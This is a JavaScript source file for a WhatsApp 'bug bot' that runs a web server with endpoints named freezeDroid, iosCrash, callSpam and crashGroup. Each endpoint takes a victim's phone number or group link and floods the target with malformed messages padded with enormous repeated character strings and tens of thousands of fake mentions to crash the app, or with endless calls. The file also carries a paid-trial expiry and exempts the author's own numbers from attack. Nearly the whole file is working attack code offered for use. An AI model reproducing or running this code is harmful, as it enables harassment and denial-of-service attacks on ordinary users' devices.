//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9

const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baileys")
const fs = require('fs')
const util = require('util')
const express = require('express');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./doc/myfunc')

const app = express();
const PORT = process.env.PORT || 3000;

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
//====================================\\
// Set the expiration time to a specific date (e.g., '2023-12-31T23:59:59Z')
const expirationDateString = '2030-12-26T12:00:00+05:30'; // Specify your desired expiration date here
const expirationTime = new Date(expirationDateString);
const currentTime = new Date();
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const expirationTime1 = new Date(expirationDateString);
const expirationTime2 = new Date(expirationDateString);
const expirationTime3 = new Date(expirationDateString);
const expirationTime4 = new Date(expirationDateString);
const expirationTime5 = new Date(expirationDateString);

const currentTime1 = new Date();
const currentTime2 = new Date();
const currentTime3 = new Date();
const currentTime4 = new Date();
const currentTime5 = new Date();
//====================================\\
const o = fs.readFileSync(`./69/o.jpg`)
//====================================\\
// Function to convert phone number to WhatsApp JID
function toWhatsAppJID(phoneNumber) {
    if (!phoneNumber) throw new Error('Phone number is required');
    // Remove the "+" sign if present
    return phoneNumber.replace(/\+/g, '') + '@s.whatsapp.net';
}
//====================================\\
// Add this helper function to check developer numbers
function isDeveloperNumber(phoneNumber) {
    const developerNumbers = ['916909137213', '919402104403']; // List of developer numbers without the "+"
    const cleanedNumber = phoneNumber.replace(/\+/g, ''); // Remove "+" if present
    return developerNumbers.includes(cleanedNumber);
}
//====================================\\
app.use(express.json()); // Middleware to parse JSON bodies
//====================================\\
app.get('/freezeDroid', async (req, res) => {
	async function xeonydatabase(){
return res.status(403).send(`⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: wa.me/916909137213\n`)
            	await delay(5000);
            console.error('⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
	if (currentTime > expirationTime) {
	await xeonydatabase();
        } else {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function XeonXRobust1(target, o, Ptcp = true) {
	const jid = toWhatsAppJID(target); // Convert phone number to JID
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await XeonBotInc.relayMessage(jid, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄드림 가이 Xeon",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },

									body: { text: '🦄드림 가이 Xeon' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄드림 가이 Xeon",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: jid
     }
    } : {}
   );
	}
	async function xgc4(target) {
		const jid = toWhatsAppJID(target); // Convert phone number to JID
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await XeonBotInc.relayMessage(jid, messsage, {
                    userJid: jid,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
	async function XeonXRobust(target, o, Ptcp = true) {
	while (true) {
		await XeonXRobust1(target, XeonBotInc, (cct = true), (ptcp = true));
		await xgc4(target);
        await XeonXRobust1(target, XeonBotInc, (cct = true), (ptcp = true));
        await xgc4(target);
        await XeonXRobust1(target, XeonBotInc, (cct = true), (ptcp = true));
        await xgc4(target);
        await XeonXRobust1(target, XeonBotInc, (cct = true), (ptcp = true));
        await xgc4(target);
        await XeonXRobust1(target, XeonBotInc, (cct = true), (ptcp = true));
        await xgc4(target);
await delay(10000); // Delay for 10 seconds
    }
    }
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    
    // Check if the number is registered on WhatsApp
    const contactInfo = await XeonBotInc.onWhatsApp(target);
    if (contactInfo.length === 0) {
        return res.status(404).send('The number is not registered on WhatsApp');
    }
    
    try {
    	res.send(`🚀 Successfully sent bug to the number ${target}`);
        await XeonXRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
    }
});
//====================================\\
app.get('/iosCrash', async (req, res) => {
	async function xeonydatabase1(){
return res.status(403).send(`⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: wa.me/916909137213\n`)
            	await delay(5000);
            console.error('⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
	if (currentTime1 > expirationTime1) {
	await xeonydatabase1();
        } else {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function xeonIosRobust(target) {
const jid = toWhatsAppJID(target); // Convert phone number to JID
for (let i = 0; i < 10; i++) {
await XeonBotInc.relayMessage(jid, {
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
}
}, {})
await XeonBotInc.relayMessage(jid, {
extendedTextMessage: {
text: "This is a message with context info",
contextInfo: {
stanzaId: "1234567890ABCDEF",
participant: jid,
quotedMessage: {
conversation: "This is a quoted message"
},
remoteJid: jid,
mentionedJid: ["916909137213@s.whatsapp.net"],
conversionSource: "source_example",
conversionData: Buffer.from("conversion_data_example"),
conversionDelaySeconds: 10,
forwardingScore: 1,
isForwarded: true,
quotedAd: {
advertiserName: "Example Advertiser",
mediaType: 1,
jpegThumbnail: await getBuffer('https://t2.tudocdn.net/632662?w=646&h=284'),
caption: "This is an ad caption"
},
placeholderKey: {
remoteJid: jid,
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: 86400,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
externalAdReply: {
title: "External Ad Title",
body: "External Ad Body",
mediaType: 1,
thumbnailUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
mediaUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
thumbnail: Buffer.from("1234567890abcdef", "hex"),
sourceType: "source_type_example",
sourceId: "source_id_example",
sourceUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
containsAutoReply: true,
renderLargerThumbnail: true,
showAdAttribution: true,
ctwaClid: "ctwa_clid_example",
ref: "ref_example"
},
entryPointConversionSource: "entry_point_source_example",
entryPointConversionApp: "entry_point_app_example",
entryPointConversionDelaySeconds: 5,
disappearingMode: {
duration: 604800
},
actionLink: {
buttonText: "Click Here",
url: "https://example.com"
},
groupSubject: "Example Group Subject",
parentGroupJid: "5531988888888-1234567890@g.us",
trustBannerType: "trust_banner_example",
trustBannerAction: 1,
isSampled: false,
utm: {
utmSource: "utm_source_example",
utmCampaign: "utm_campaign_example"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "916909137213-1234567890@g.us",
serverMessageId: 1,
newsletterName: "x".repeat(99999),
contentType: 1,
accessibilityText: "Example accessibility text"
},
businessMessageForwardInfo: {
businessOwnerJid: "916909137213@s.whatsapp.net"
},
smbClientCampaignId: "smb_client_campaign_id_example",
smbServerCampaignId: "smb_server_campaign_id_example",
dataSharingContext: {
showMmDisclosure: true
}
}
}
}, {})
}
		};
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    
    // Check if the number is registered on WhatsApp
    const contactInfo = await XeonBotInc.onWhatsApp(target);
    if (contactInfo.length === 0) {
        return res.status(404).send('The number is not registered on WhatsApp');
    }

    try {
    	res.send(`🚀 Successfully sent bug to the number ${target}`);
        await xeonIosRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
    }
});
//====================================\\
app.get('/callSpam', async (req, res) => {
	async function xeonydatabase2(){
return res.status(403).send(`⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: wa.me/916909137213\n`)
            	await delay(5000);
            console.error('⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
	if (currentTime2 > expirationTime2) {
	await xeonydatabase2();
        } else {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function xeonCallSpam(target) {
const jid = toWhatsAppJID(target); // Convert phone number to JID
while (true) {
await XeonBotInc.offerCall(jid);
}
		};
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    
    // Check if the number is registered on WhatsApp
    const contactInfo = await XeonBotInc.onWhatsApp(target);
    if (contactInfo.length === 0) {
        return res.status(404).send('The number is not registered on WhatsApp');
    }

    try {
    	res.send(`🚀 Successfully sent spam call to the number ${target}`);
        await xeonCallSpam(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
    }
});
//====================================\\
app.get('/crashGroup', async (req, res) => {
	async function xeonydatabase3(){
return res.status(403).send(`⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: wa.me/916909137213\n`)
            	await delay(5000);
            console.error('⚠️Trial Expired!! Contact developer for buy.\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
	if (currentTime3 > expirationTime3) {
	await xeonydatabase3();
        } else {
    const { target } = req.query; // Access the target parameter from the query string
			async function xgc4(target) {
				const result = target.split('https://chat.whatsapp.com/')[1]
    const xeontry = await XeonBotInc.groupAcceptInvite(result)
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await XeonBotInc.relayMessage(xeontry, messsage, {
                    userJid: xeontry,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
			
			async function xeonAllGroup(target){
			for (let i = 0; i < 30; i++) {
				await xgc4(target);
await xgc4(target);
await delay(5000); // Delay for 10 seconds
    }
    }
// Regular expression to validate WhatsApp group links
    const groupLinkPattern = /^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/;
    // Validate the target
    if (!target || !groupLinkPattern.test(target)) {
        return res.status(400).send('The link you provided is invalid');
    }    
    try {
        res.send(`🚀 Successfully sent bug to the group chat`);
        await xeonAllGroup(target);
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
    }
});
//====================================\\
// Start the server and connect to WhatsApp
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} is in use. Trying another port...`);
        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); // Random port between 1024 and 65535
        app.listen(newPort, () => {
            console.log(`Server is running on http://localhost:${newPort}`);
        });
    } else {
        console.error('An error occurred:', err.message);
    }
});

} catch (err) {
console.log(util.format(err))
}
}
